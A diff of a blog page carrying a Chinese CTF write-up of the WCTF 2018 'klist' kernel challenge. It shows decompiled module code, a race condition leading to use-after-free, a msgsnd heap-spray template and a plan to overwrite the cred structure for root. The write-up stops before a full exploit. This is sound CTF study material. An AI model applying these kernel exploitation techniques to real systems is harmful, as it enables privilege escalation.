@@ -145,198 +145,270 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">WCTF 2018 klist</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-08-07 17:42:36
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/kernel-pwn/">kernel-pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/heap-spray/">heap spray</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Double-Fetch/">Double Fetch</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.2k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>11 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目实现的功能很容易看出来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x1338</span> )</span><br><span class="line">        <span class="keyword">return</span> select_item(a1, a3);</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x1338</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x1337</span> )</span><br><span class="line">            <span class="keyword">return</span> add_item(a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x1339</span> )</span><br><span class="line">            <span class="keyword">return</span> remove_item(a3);</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x133A</span> )</span><br><span class="line">            <span class="keyword">return</span> list_head(a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要实现了对堆块的申请，释放，读写</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">add_item</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rax</span></span><br><span class="line">    __int64 size; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">    __int64 chunk; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v7, a1, <span class="number">0x10</span>LL) || v7[<span class="number">0</span>] &gt; <span class="number">0x400</span>uLL )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    v1 = _kmalloc(v7[<span class="number">0</span>] + <span class="number">0x18</span>, <span class="number">0x14202C0</span>LL);</span><br><span class="line">    size = v7[<span class="number">0</span>];</span><br><span class="line">    v3 = v7[<span class="number">1</span>];</span><br><span class="line">    *v1 = <span class="number">1</span>;</span><br><span class="line">    chunk = v1;</span><br><span class="line">    *(v1 + <span class="number">8</span>) = size;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v1 + <span class="number">0x18</span>, v3, size) )</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(chunk);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        mutex_lock(&amp;list_lock);</span><br><span class="line">        v5 = g_list;</span><br><span class="line">        g_list = chunk;</span><br><span class="line">        *(chunk + <span class="number">0x10</span>) = v5;</span><br><span class="line">        mutex_unlock(&amp;list_lock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这里可以分析出申请堆块的参数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>以及堆块的结构：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    inuse;</span><br><span class="line">    size;</span><br><span class="line">    prev;</span><br><span class="line">    buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">remove_item</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rax</span></span><br><span class="line">    __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">    __int64 v5; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        mutex_lock(&amp;list_lock);</span><br><span class="line">        <span class="keyword">if</span> ( !a1 )</span><br><span class="line">        &#123;</span><br><span class="line">            v5 = g_list;</span><br><span class="line">            <span class="keyword">if</span> ( g_list )</span><br><span class="line">            &#123;</span><br><span class="line">                g_list = *(g_list + <span class="number">16</span>);</span><br><span class="line">                put(v5);</span><br><span class="line">                mutex_unlock(&amp;list_lock);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        &#125;</span><br><span class="line">        v1 = g_list;</span><br><span class="line">        <span class="keyword">if</span> ( a1 != <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !g_list )</span><br><span class="line">            &#123;</span><br><span class="line">                LABEL_12:</span><br><span class="line">                mutex_unlock(&amp;list_lock);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v2 = <span class="number">1LL</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                ++v2;</span><br><span class="line">                v1 = *(v1 + <span class="number">16</span>);</span><br><span class="line">                <span class="keyword">if</span> ( a1 == v2 )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> ( !v1 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = *(v1 + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">            *(v1 + <span class="number">0x10</span>) = *(v3 + <span class="number">0x10</span>);</span><br><span class="line">            put(v3);</span><br><span class="line">            mutex_unlock(&amp;list_lock);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在删除函数可以看出来这里并没有直接kfree来进行删除，而是调用了put函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">put</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !_InterlockedDecrement(a1) )</span><br><span class="line">      <span class="keyword">return</span> kfree(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而这个put函数就是对chunk的inuse位进行减一的操作，如果为0则进行kfree，结合上面的remove函数其中的脱链操作也是没有问题的，不存在UAF</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">select_item</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v3; <span class="comment">// rax</span></span><br><span class="line">    __int64 *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;list_lock);</span><br><span class="line">    v2 = g_list;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !g_list )</span><br><span class="line">        &#123;</span><br><span class="line">            LABEL_8:</span><br><span class="line">            mutex_unlock(&amp;list_lock);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            ++v3;</span><br><span class="line">            v2 = *(v2 + <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> ( a2 == v3 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !v2 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    get(v2);</span><br><span class="line">    mutex_unlock(&amp;list_lock);</span><br><span class="line">    v4 = *(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    mutex_lock(v4 + <span class="number">1</span>);</span><br><span class="line">    put(*v4);</span><br><span class="line">    *v4 = v2;</span><br><span class="line">    mutex_unlock(v4 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看select函数，这一函数实现的功能是选取一个chunk放到(fd+0xc8)位置。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">list_head</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;list_lock);</span><br><span class="line">    get(g_list);</span><br><span class="line">    v1 = g_list;</span><br><span class="line">    mutex_unlock(&amp;list_lock);</span><br><span class="line">    v2 = -(copy_to_user(a1, v1, *(v1 + <span class="number">8</span>) + <span class="number">0x18</span>LL) != <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    put(g_list);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>list_head函数则是取出chunk内容，这里的size是在create时放在堆块中的size。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目中题看上去是没有任何问题的，但是在启动脚本中我们可以看到：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -m <span class="number">512</span>M \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">2</span>,sockets=<span class="number">1</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>
+
+<p>启动了两个核心，虽然程序使用了互斥锁但任存在条件竞争漏洞</p>
+<p>在create的入链操作中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;list_lock);</span><br><span class="line">v5 = g_list;</span><br><span class="line">g_list = chunk;</span><br><span class="line">*(chunk + <span class="number">0x10</span>) = v5;</span><br><span class="line">mutex_unlock(&amp;list_lock);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里是首先上锁，然后进行操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;list_lock);</span><br><span class="line">get(g_list);</span><br><span class="line">v1 = g_list;</span><br><span class="line">mutex_unlock(&amp;list_lock);</span><br><span class="line">v2 = -(copy_to_user(a1, v1, *(v1 + <span class="number">8</span>) + <span class="number">0x18</span>LL) != <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">put(g_list);</span><br></pre></td></tr></table></figure>
+
+<p>然而在list_head函数中是在获取了链中的第一个chunk就会释放锁，并且最后会进行put函数，如果我们能够在释放锁之后，put函数之前让create新建的chunk入链则会让新入链的chunk进入put函数，然而新chunk的inuse位为1，所以就会直接free掉，那么此时就存在了UAF的chunk了。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里就接着看read和write函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_read</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 *v5; <span class="comment">// r13</span></span><br><span class="line">    __int64 v6; <span class="comment">// rsi</span></span><br><span class="line">    _QWORD *v7; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">    v5 = *(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    mutex_lock(v5 + <span class="number">1</span>);</span><br><span class="line">    v6 = *v5;</span><br><span class="line">    <span class="keyword">if</span> ( *v5 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(v6 + <span class="number">8</span>) &lt;= a3 )</span><br><span class="line">            a3 = *(v6 + <span class="number">8</span>);</span><br><span class="line">        v7 = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( copy_to_user(a2, v6 + <span class="number">0x18</span>, a3) )</span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> a3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        mutex_unlock(v5 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到read函数操作的chunk就是我们在select函数中放到(fd+0xc8)位置的chunk，并且只要我们传入的第三个参数不大于chunk中记录size的位置就可以进行读取</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 *v4; <span class="comment">// rbp</span></span><br><span class="line">    __int64 v5; <span class="comment">// rdi</span></span><br><span class="line">    __int64 v6; <span class="comment">// rax</span></span><br><span class="line">    _QWORD *v7; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">    v4 = *(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    mutex_lock(v4 + <span class="number">1</span>);</span><br><span class="line">    v5 = *v4;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(v5 + <span class="number">8</span>) &lt;= a3 )</span><br><span class="line">            a3 = *(v5 + <span class="number">8</span>);</span><br><span class="line">        v6 = copy_from_user(v5 + <span class="number">0x18</span>, a2, a3);</span><br><span class="line">        v7 = v4 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> a3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        mutex_unlock(v4 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>write函数类似于上面的read函数。</p>
+<p>那么我们的思路就是覆盖上面chunk存放size的位置即可了，这样我们就可以实现任意地址写了。那么我们就需要用到堆喷的技术，内核的堆喷我的理解就是申请大量的chunk，那么大概率会一个chunk落在期望的位置上，而这道题目我们期望的位置也就是存在UAF的堆块的位置。这道题因为在init中的限制，这里选择的msgsnd进行堆喷，下面是进行堆喷的使用模板：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 96-48</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[BUFF_SIZE];</span><br><span class="line">&#125; msg;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(msg.mtext, <span class="number">0x42</span>, BUFF_SIZE<span class="number">-1</span>);</span><br><span class="line">msg.mtext[BUFF_SIZE] = <span class="number">0</span>;</span><br><span class="line">msg.mtype = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line"></span><br><span class="line">msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在一次msgsnd的过程中会申请一个size为96的chunk，其中前面的48字节为不可控的内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>好在msg_msg结构体的前16个字节为两个指针，并且后八位正好落在chunk的size位上，那么如果有一个msg_msg结构体落在了我们的UAF的chunk上我们就可以进行任意地址读写了。接着的思路就是提权，在前两篇的kernel文章中提到了三种提权方式，相比较下使用修改cred结构体的提权方式更为简单，不熟悉的朋友可以去看一下 <a href="https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/">kernel pwn 任意地址读写提升权限[1]</a>  <strong>不过这道题目即便是泄露了地址也无法计算当前chunk的地址与cred结构体的地址的偏移所以没法直接使用以前的方法</strong> 这里更好的办法是直接根据uid去寻找cred结构体，因为在上面那片文章cred结构体是通过kmem_cache_alloc创建的。</p>
